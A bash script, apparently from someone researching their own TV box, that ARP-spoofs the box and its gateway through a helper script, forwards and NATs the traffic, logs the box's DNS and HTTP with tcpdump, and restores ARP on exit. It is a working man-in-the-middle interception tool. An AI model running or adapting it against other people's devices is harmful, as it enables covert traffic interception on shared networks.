#!/bin/bash
# eyes.sh — targeted DNS observation for the TV box (192.0.2.125)
# Usage: sudo bash ~/tvbox/ssrf/eyes.sh [minutes]   (default 10)
# Becomes the box's ARP next-hop, forwards its traffic, logs its DNS/HTTP,
# then restores ARP state on exit. Router config untouched.
set -u
BOX=192.0.2.125
GW=192.0.2.1
IF=enp1s0
MIN=${1:-10}
LOG=~/tvbox/ssrf/eyes.log
SP=~/tvbox/ssrf/minispoof.py
BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n))
GWMAC=$(awk -v i="$GW" '$1==i {print $3; exit}' <(arp -n))
MYMAC=$(cat /sys/class/net/$IF/address)
[ -z "$BOXMAC" ] && { ping -c1 -W1 $BOX >/dev/null 2>&1; BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n)); }
[ -z "$BOXMAC" ] && { echo "box not reachable via ARP, aborting"; exit 1; }
echo "box=$BOX/$BOXMAC gw=$GW/$GWMAC me=$IF/$MYMAC duration=${MIN}min"

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE
iptables -A FORWARD -s $BOX -o $IF -j ACCEPT
iptables -A FORWARD -d $BOX -i $IF -j ACCEPT

cleanup() {
  echo; echo "[*] restoring..."
  kill $SP1 $SP2 $TCP 2>/dev/null
  python3 $SP $IF $GWMAC $BOX $GW 3 &      # tell box: gw is at GWMAC
  python3 $SP $IF $BOXMAC $GW $BOX 3 &     # tell router: box is at BOXMAC
  wait 2>/dev/null
  iptables -t nat -D POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE
  iptables -D FORWARD -s $BOX -o $IF -j ACCEPT
  iptables -D FORWARD -d $BOX -i $IF -j ACCEPT
  echo "[*] done. log at $LOG"
  exit 0
}
trap cleanup INT TERM

timeout $((MIN*60)) python3 $SP $IF $MYMAC $BOX $GW 600 & SP1=$!
timeout $((MIN*60)) python3 $SP $IF $MYMAC $GW $BOX 600 & SP2=$!

timeout $((MIN*60)) tcpdump -i $IF -nn -l "ip and host $BOX and (udp port 53 or tcp port 80)" -A 2>/dev/null | \
  stdbuf -oL cat > "$LOG" &
TCP=$!

echo "[*] watching. Power-cycle the box now (unplug 5s, replug). Ctrl-C to stop early."
wait $TCP
cleanup
